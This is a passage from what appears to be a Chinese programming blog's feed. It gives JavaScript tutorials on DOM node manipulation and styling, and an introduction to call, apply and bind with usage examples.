class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//2009ES5之前发布的ECMASCRIPT标准</span></span><br><span class="line"><span class="keyword">var</span> div1 = <span class="built_in">document</span>.getElementById(<span class="string">&quot;box1&quot;</span>);<span class="comment">//通过id获取元素节点(因为id是唯一的所以只获取一个)</span></span><br><span class="line"><span class="keyword">var</span> arr1 = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;box2&quot;</span>)<span class="comment">//通过标签名获取元素节点数组</span></span><br><span class="line"><span class="keyword">var</span> arr2 = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;div&quot;</span>)<span class="comment">//通过类名获取元素节点数组</span></span><br><span class="line"> <span class="comment">//ES5之后的ECMASCRIPT标准</span></span><br><span class="line"><span class="comment">//document.querySelector 返回最先匹配的第一个对象</span></span><br><span class="line"><span class="keyword">var</span> abc = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#b&quot;</span>)<span class="comment">//和document.getElementById获取的对象是一样的</span></span><br><span class="line"><span class="keyword">var</span> cba = <span class="built_in">document</span>.querySelector(<span class="string">&quot;.b&quot;</span>)</span><br><span class="line"><span class="comment">//document.querySelectorAll 获取所有匹配到的元素对象</span></span><br><span class="line"><span class="keyword">var</span> aaa = <span class="built_in">document</span>.querySelectorAll(<span class="string">&quot;.b&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>2.DOM中访问关系的获取</strong></p><ul><li>获取父节点：节点.parentNode</li><li>获取兄弟节点：nextSibling    |  nextElementSibling | previousSibling | previousElementSibling</li><li>获取子节点：   firstChild | firstElementChild | lastChild | lastElementChild</li><li>所有子节点： childNodes | children</li></ul><p><strong>3.DOM节点的操作</strong></p><ul><li>创建节点：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">新的标签 = <span class="built_in">document</span>.createElement(<span class="string">&quot;标签名&quot;</span>)；</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>插入节点</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">方式一： </span><br><span class="line">父节点.appendChild（新的子节点）<span class="comment">//父节点的最后插入一个新的子节点</span></span><br><span class="line">            <span class="comment">//1.创建元素</span></span><br><span class="line"><span class="keyword">var</span> h1 = <span class="built_in">document</span>.createElement(<span class="string">&quot;h1&quot;</span>)</span><br><span class="line"><span class="comment">//2.设置元素</span></span><br><span class="line">h1.innerHTML = <span class="string">&quot;你今天好帅！&quot;</span></span><br><span class="line"><span class="comment">//3.插入元素，首先找到被插入的元素</span></span><br><span class="line"><span class="keyword">var</span> d1 = <span class="built_in">document</span>.querySelector(<span class="string">&quot;.d1&quot;</span>)</span><br><span class="line"><span class="comment">//4.通过appendChild()追加子元素</span></span><br><span class="line">d1.appendChild(h1)</span><br><span class="line">方式二：</span><br><span class="line">父节点.insertBefore（新的子节点，作为参考的子节点）<span class="comment">//在参考节点前插入一个新节点</span></span><br><span class="line"><span class="comment">//在什么面前插入元素</span></span><br><span class="line"><span class="comment">//1.创建img元素</span></span><br><span class="line"><span class="keyword">var</span> img  = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>)</span><br><span class="line"><span class="comment">//2.设置img的src属性</span></span><br><span class="line">img.src = <span class="string">&quot;img/123.jpg&quot;</span></span><br><span class="line"><span class="comment">//3.找到被插入的父元素，&lt;body&gt;</span></span><br><span class="line"><span class="keyword">var</span> body = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;body&#x27;</span>)</span><br><span class="line"><span class="comment">//4.在body的d3前面插入内容</span></span><br><span class="line"><span class="keyword">var</span> d3 = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.d3&#x27;</span>)</span><br><span class="line">body.insertBefore(img,d3)</span><br><span class="line">d3.parentElement.insertBefore(img,d3) <span class="comment">// 通过d3.parentElement直接获取父元素</span></span><br></pre></td></tr></table></figure><ul><li>删除节点</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">被删除的父元素.removeChild（删除的元素）</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除元素</span></span><br><span class="line"><span class="comment">//1.找到被删除的元素</span></span><br><span class="line"><span class="keyword">var</span> body = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;body&#x27;</span>)</span><br><span class="line"><span class="comment">//2.找到要删除的元素</span></span><br><span class="line"><span class="keyword">var</span> d2 = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.d2&#x27;</span>)</span><br><span class="line"><span class="comment">//3.使用removeChild()方法删除元素</span></span><br><span class="line">body.removeChild(d2)</span><br></pre></td></tr></table></figure><ul><li>复制节点</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">要复制的节点.cloneNode()</span><br><span class="line">要复制的节点.cloneNode(<span class="literal">true</span>)</span><br><span class="line"><span class="comment">//不带参数或者带参数false：只复制节点本身，不复制子节点</span></span><br><span class="line"><span class="comment">//带参数true：即复制节点本身，也复制所有子节点</span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong>节点的获取、设置和删除</strong><br>1.获取节点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">元素节点.getAttribute（属性名）</span><br></pre></td></tr></table></figure><p>2.设置节点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">元素节点.setAttribute（属性名，新的属性值）</span><br></pre></td></tr></table></figure><p>3.删除节点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">元素节点.removeAttribute (属性名)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;d1&quot;</span>&gt;</span><br><span class="line">helloWorld</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">var</span> d1 = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#d1&quot;</span>)</span><br><span class="line"><span class="comment">//获取属性值</span></span><br><span class="line"><span class="built_in">console</span>.log(d1.id)</span><br><span class="line"><span class="built_in">console</span>.log(d1[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line"><span class="built_in">console</span>.log(d1.getAttribute(<span class="string">&#x27;id&#x27;</span>))</span><br><span class="line"><span class="comment">//设置属性</span></span><br><span class="line">d1.id = <span class="string">&quot;d2&quot;</span></span><br><span class="line">d1[<span class="string">&#x27;id&#x27;</span>] = <span class="string">&quot;d3&quot;</span></span><br><span class="line"><span class="comment">//setAttribute(&quot;属性名称&quot;,&quot;属性值&quot;)</span></span><br><span class="line">d1.setAttribute(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;d4&quot;</span>)</span><br><span class="line"></span><br><span class="line">d1.abc=<span class="string">&quot;789&quot;</span><span class="comment">//默认元素中如果没有此属性，那么此属性只会创建在对象中，不会显示在html上</span></span><br><span class="line"><span class="built_in">console</span>.log(d1)</span><br><span class="line"><span class="built_in">console</span>.log([d1])</span><br><span class="line"></span><br><span class="line">d1.setAttribute(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;666&quot;</span>)<span class="comment">//默认元素中如果没有此属性，那么此属性不会创建在对象中个，会显示在html上</span></span><br><span class="line"><span class="built_in">console</span>.log(d1)</span><br><span class="line"><span class="built_in">console</span>.log([d1])</span><br><span class="line"><span class="comment">//删除子元素</span></span><br><span class="line">d1.removeAttribute(<span class="string">&quot;abc&quot;</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p><strong>innerHtml和innerText的区别</strong></p><ul><li>value：标签的value属性</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;d1&quot;</span>&gt;</span><br><span class="line">helloword</span><br><span class="line">&lt;h1&gt;helloword&lt;/h1&gt;</span><br><span class="line">&lt;h1&gt;helloword&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> id=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;admin&quot;</span>/&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> id=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;123456&quot;</span>/&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">var</span> usernameInput = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#username&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> username = usernameInput.value;</span><br><span class="line"><span class="built_in">console</span>.log(username)<span class="comment">//admin</span></span><br><span class="line"><span class="keyword">var</span> passwordInput = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#password&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> password = passwordInput.value</span><br><span class="line"><span class="built_in">console</span>.log(password)<span class="comment">//123456</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>innerHtml：双闭合标签里面的内容（识别标签）</li><li>innerText：双闭合标签里面的内容（不识别标签）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;d1&quot;</span>&gt;</span><br><span class="line">helloword</span><br><span class="line">&lt;h1&gt;helloword&lt;/h1&gt;</span><br><span class="line">&lt;h1&gt;helloword&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">var</span> d1 = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#d1&#x27;</span>)</span><br><span class="line"><span class="comment">//获取的d1内部的html代码</span></span><br><span class="line"><span class="built_in">console</span>.log(d1.innerHTML)</span><br><span class="line"><span class="comment">//获取d1内部的文本内容</span></span><br><span class="line"><span class="built_in">console</span>.log(d1.innerText)</span><br><span class="line"><span class="comment">//获取包含d1的html代码</span></span><br><span class="line"><span class="built_in">console</span>.log(d1.outerHTML)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200901221439591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="DOM操作设置元素样式"><a href="#DOM操作设置元素样式" class="headerlink" title="DOM操作设置元素样式"></a><strong>DOM操作设置元素样式</strong></h3><p>1.通过style修改属性样式<br>2.通过className修改属性样式<br>3.通过增加style标签来修改样式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;d1&quot;</span>&gt;</span><br><span class="line">hello</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;d2&quot;</span> &gt;</span><br><span class="line">hello</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;d3&quot;</span> &gt;</span><br><span class="line">hello</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="comment">//1.通过style修改属性样式</span></span><br><span class="line"><span class="keyword">var</span> abc1 = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#d1&#x27;</span>)</span><br><span class="line">abc1.style.width= <span class="string">&quot;200px&quot;</span>;</span><br><span class="line">abc1.style.height= <span class="string">&quot;200px&quot;</span>;</span><br><span class="line">abc1.style.backgroundColor= <span class="string">&quot;red&quot;</span>;<span class="comment">//设置css属性时，如果css属性是多个单词组成，则采用驼峰命名法</span></span><br><span class="line"><span class="comment">//注意：通过style属性设置的值，优先级是最高的，因为是直接修改标签的style属性</span></span><br><span class="line"><span class="comment">//2.通过className修改属性样式</span></span><br><span class="line"><span class="keyword">var</span> abc2 = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#d2&#x27;</span>)</span><br><span class="line">abc2.className = <span class="string">&quot;bg bigFont&quot;</span></span><br><span class="line"><span class="comment">//类名还可以通过classList属性的add/remove/replace进行修改className</span></span><br><span class="line">abc2.classList.add(<span class="string">&quot;shaow&quot;</span>)</span><br><span class="line">abc2.classList.replace(<span class="string">&quot;bigFont&quot;</span>,<span class="string">&quot;smallFont&quot;</span>)</span><br><span class="line">abc2.classList.remove(<span class="string">&quot;bg&quot;</span>)</span><br><span class="line"><span class="comment">//3.通过增加style标签来修改样式</span></span><br><span class="line"><span class="keyword">var</span> style=<span class="built_in">document</span>.createElement(<span class="string">&quot;style&quot;</span>)</span><br><span class="line"><span class="comment">//反引号``可以包括多行字符串</span></span><br><span class="line">style.innerHTML= <span class="string">`.d3&#123;</span></span><br><span class="line"><span class="string">width: 800px;</span></span><br><span class="line"><span class="string">height: 800px;</span></span><br><span class="line"><span class="string">background-color: orange;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="keyword">var</span> body = <span class="built_in">document</span>.querySelector(<span class="string">&quot;body&quot;</span>)</span><br><span class="line">body.appendChild(style)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>call,apply,bind的基本介绍</title>
    <link href="http://aiolimp.com/2021/07/18/call%EF%BC%8Capplay%EF%BC%8Cbind/"/>
    <id>http://aiolimp.com/2021/07/18/call%EF%BC%8Capplay%EF%BC%8Cbind/</id>
    <published>2021-07-18T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.211Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="call-apply-bind的基本介绍"><a href="#call-apply-bind的基本介绍" class="headerlink" title="call,apply,bind的基本介绍"></a>call,apply,bind的基本介绍</h2><h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fun.call(thisArg, param1, param2, ...)</span><br><span class="line">fun.apply(thisArg, [param1,param2,...])</span><br><span class="line">fun.bind(thisArg, param1, param2, ...)</span><br></pre></td></tr></table></figure><h4 id="返回值："><a href="#返回值：" class="headerlink" title="返回值："></a>返回值：</h4><p>call/apply：<code>fun</code>执行的结果 bind：返回<code>fun</code>的拷贝，并拥有指定的<code>this</code>值和初始参数</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><code>thisArg</code>(可选):</p><ol><li><strong><code>fun</code>的<code>this</code>指向<code>thisArg</code>对象</strong></li><li>非严格模式下：thisArg指定为null，undefined，fun中的this指向window对象.</li><li>严格模式下：<code>fun</code>的<code>this</code>为<code>undefined</code></li><li>值为原始值(数字，字符串，布尔值)的this会指向该原始值的自动包装对象，如 String、Number、Boolean</li></ol><p><code>param1,param2</code>(可选): 传给<code>fun</code>的参数。</p><ol><li>如果param不传或为 null/undefined，则表示不需要传入任何参数.</li><li>apply第二个参数为数组，数组内的值为传给<code>fun</code>的参数。</li></ol><h3 id="调用call-apply-bind的必须是个函数"><a href="#调用call-apply-bind的必须是个函数" class="headerlink" title="调用call/apply/bind的必须是个函数"></a>调用<code>call</code>/<code>apply</code>/<code>bind</code>的必须是个函数</h3><p>call、apply和bind是挂在Function对象上的三个方法,只有函数才有这些方法。</p><p>只要是函数就可以，比如: <code>Object.prototype.toString</code>就是个函数，我们经常看到这样的用法：<code>Object.prototype.toString.call(data)</code></p><h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><p>改变函数执行时的this指向，目前所有关于它们的运用，都是基于这一点来进行的。</p><h3 id="如何不弄混call和apply"><a href="#如何不弄混call和apply" class="headerlink" title="如何不弄混call和apply"></a>如何不弄混call和apply</h3><blockquote><p>弄混这两个API的不在少数，不要小看这个问题，记住下面的这个方法就好了。</p></blockquote><p><code>apply</code>是以<code>a</code>开头，它传给<code>fun</code>的参数是<code>Array</code>，也是以<code>a</code>开头的。</p><h3 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h3><h4 id="call与apply的唯一区别"><a href="#call与apply的唯一区别" class="headerlink" title="call与apply的唯一区别"></a>call与apply的唯一区别</h4><p>传给<code>fun</code>的参数写法不同：</p><ul><li><code>apply</code>是第2个参数，这个参数是一个数组：传给<code>fun</code>参数都写在数组中。</li><li><code>call</code>从第2~n的参数都是传给<code>fun</code>的。</li></ul><h4 id="call-apply与bind的区别"><a href="#call-apply与bind的区别" class="headerlink" title="call/apply与bind的区别"></a>call/apply与bind的区别</h4><p><strong>执行</strong>：</p><ul><li>call/apply改变了函数的this上下文后马上<strong>执行该函数</strong></li><li>bind则是返回改变了上下文后的函数,<strong>不执行该函数</strong></li></ul><p><strong>返回值</strong>:</p><ul><li>call/apply 返回<code>fun</code>的执行结果</li><li>bind返回fun的拷贝，并指定了fun的this指向，保存了fun的参数。</li></ul><h2 id="call和apply的应用场景："><a href="#call和apply的应用场景：" class="headerlink" title="call和apply的应用场景："></a>call和apply的应用场景：</h2><ol><li>判断数据类型：</li></ol><p><code>Object.prototype.toString</code>用来判断类型再合适不过，借用它我们几乎可以判断所有类型的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function isType(data, type) &#123;</span><br><span class="line">    const typeObj &#x3D; &#123;</span><br><span class="line">        &#39;[object String]&#39;: &#39;string&#39;,</span><br><span class="line">        &#39;[object Number]&#39;: &#39;number&#39;,</span><br><span class="line">        &#39;[object Boolean]&#39;: &#39;boolean&#39;,</span><br><span class="line">        &#39;[object Null]&#39;: &#39;null&#39;,</span><br><span class="line">        &#39;[object Undefined]&#39;: &#39;undefined&#39;,</span><br><span class="line">        &#39;[object Object]&#39;: &#39;object&#39;,</span><br><span class="line">        &#39;[object Array]&#39;: &#39;array&#39;,</span><br><span class="line">        &#39;[object Function]&#39;: &#39;function&#39;,</span><br><span class="line">        &#39;[object Date]&#39;: &#39;date&#39;, &#x2F;&#x2F; Object.prototype.toString.call(new Date())</span><br><span class="line">        &#39;[object RegExp]&#39;: &#39;regExp&#39;,</span><br><span class="line">        &#39;[object Map]&#39;: &#39;map&#39;,</span><br><span class="line">        &#39;[object Set]&#39;: &#39;set&#39;,</span><br><span class="line">        &#39;[object HTMLDivElement]&#39;: &#39;dom&#39;, &#x2F;&#x2F; document.querySelector(&#39;#app&#39;)</span><br><span class="line">        &#39;[object WeakMap]&#39;: &#39;weakMap&#39;,</span><br><span class="line">        &#39;[object Window]&#39;: &#39;window&#39;,  &#x2F;&#x2F; Object.prototype.toString.call(window)</span><br><span class="line">        &#39;[object Error]&#39;: &#39;error&#39;, &#x2F;&#x2F; new Error(&#39;1&#39;)</span><br><span class="line">        &#39;[object Arguments]&#39;: &#39;arguments&#39;,</span><br><span class="line">    &#125;</span><br><span class="line">    let name &#x3D; Object.prototype.toString.call(data) &#x2F;&#x2F; 借用Object.prototype.toString()获取数据类型</span><br><span class="line">    let typeName &#x3D; typeObj[name] || &#39;未知类型&#39; &#x2F;&#x2F; 匹配数据类型</span><br><span class="line">    return typeName &#x3D;&#x3D;&#x3D; type &#x2F;&#x2F; 判断该数据类型是否为传入的类型</span><br><span class="line">&#125;</span><br><span class="line">console.log(</span><br><span class="line">    isType(&#123;&#125;, &#39;object&#39;), &#x2F;&#x2F; true</span><br><span class="line">    isType([], &#39;array&#39;), &#x2F;&#x2F; true</span><br><span class="line">    isType(new Date(), &#39;object&#39;), &#x2F;&#x2F; false</span><br><span class="line">    isType(new Date(), &#39;date&#39;), &#x2F;&#x2F; true</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>2.类数组借用数组的方法：</p><p>类数组因为不是真正的数组所有没有数组类型上自带的种种方法，所以我们需要去借用数组的方法。</p><p>比如借用数组的push方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var arrayLike &#x3D; &#123;</span><br><span class="line">  0: &#39;OB&#39;,</span><br><span class="line">  1: &#39;Koro1&#39;,</span><br><span class="line">  length: 2</span><br><span class="line">&#125;</span><br><span class="line">Array.prototype.push.call(arrayLike, &#39;添加元素1&#39;, &#39;添加元素2&#39;);</span><br><span class="line">console.log(arrayLike) &#x2F;&#x2F; &#123;&quot;0&quot;:&quot;OB&quot;,&quot;1&quot;:&quot;Koro1&quot;,&quot;2&quot;:&quot;添加元素1&quot;,&quot;3&quot;:&quot;添加元素2&quot;,&quot;length&quot;:4&#125;</span><br></pre></td></tr></table></figure><p>3.apply获取数组最大值最小值：</p><p>apply直接传递数组做要调用方法的参数，也省一步展开数组，比如使用<code>Math.max</code>、<code>Math.min</code>来获取数组的最大值/最小值:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const arr &#x3D; [15, 6, 12, 13, 16];</span><br><span class="line">const max &#x3D; Math.max.apply(Math, arr); &#x2F;&#x2F; 16</span><br><span class="line">const min &#x3D; Math.min.apply(Math, arr); &#x2F;&#x2F; 6</span><br></pre></td></tr></table></figure><p>4.继承</p><p>ES5的继承也都是通过借用父类的构造方法来实现父类方法/属性的继承：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 父类</span><br><span class="line">function supFather(name) &#123;</span><br><span class="line">    this.name &#x3D; name;</span><br><span class="line">    this.colors &#x3D; [&#39;red&#39;, &#39;blue&#39;, &#39;green&#39;]; &#x2F;&#x2F; 复杂类型</span><br><span class="line">&#125;</span><br><span class="line">supFather.prototype.sayName &#x3D; function (age) &#123;</span><br><span class="line">    console.log(this.name, &#39;age&#39;);</span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F; 子类</span><br><span class="line">function sub(name, age) &#123;</span><br><span class="line">    &#x2F;&#x2F; 借用父类的方法：修改它的this指向,赋值父类的构造函数里面方法、属性到子类上</span><br><span class="line">    supFather.call(this, name);</span><br><span class="line">    this.age &#x3D; age;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 重写子类的prototype，修正constructor指向</span><br><span class="line">function inheritPrototype(sonFn, fatherFn) &#123;</span><br><span class="line">    sonFn.prototype &#x3D; Object.create(fatherFn.prototype); &#x2F;&#x2F; 继承父类的属性以及方法</span><br><span class="line">    sonFn.prototype.constructor &#x3D; sonFn; &#x2F;&#x2F; 修正constructor指向到继承的那个函数上</span><br><span class="line">&#125;</span><br><span class="line">inheritPrototype(sub, supFather);</span><br><span class="line">sub.prototype.sayAge &#x3D; function () &#123;</span><br><span class="line">    console.log(this.age, &#39;foo&#39;);</span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F; 实例化子类，可以在实例上找到属性、方法</span><br><span class="line">const instance1 &#x3D; new sub(&quot;OBKoro1&quot;, 24);</span><br><span class="line">const instance2 &#x3D; new sub(&quot;小明&quot;, 18);</span><br><span class="line">instance1.colors.push(&#39;black&#39;)</span><br><span class="line">console.log(instance1) &#x2F;&#x2F; &#123;&quot;name&quot;:&quot;OBKoro1&quot;,&quot;colors&quot;:[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;,&quot;black&quot;],&quot;age&quot;:24&#125;</span><br><span class="line">console.log(instance2) &#x2F;&#x2F; &#123;&quot;name&quot;:&quot;小明&quot;,&quot;colors&quot;:[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;],&quot;age&quot;:18&#125; </span><br></pre></td></tr></table></figure><h2 id="bind的应用场景："><a href="#bind的应用场景：" class="headerlink" title="bind的应用场景："></a>bind的应用场景：</h2><h4 id="1-保存函数参数："><a href="#1-保存函数参数：" class="headerlink" title="1. 保存函数参数："></a>1. 保存函数参数：</h4><p>首先来看下一道经典的面试题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for (var i &#x3D; 1; i &lt;&#x3D; 5; i++) &#123;</span><br><span class="line">   setTimeout(function test() &#123;</span><br><span class="line">        console.log(i) &#x2F;&#x2F; 依次输出：6 6 6 6 6</span><br><span class="line">    &#125;, i * 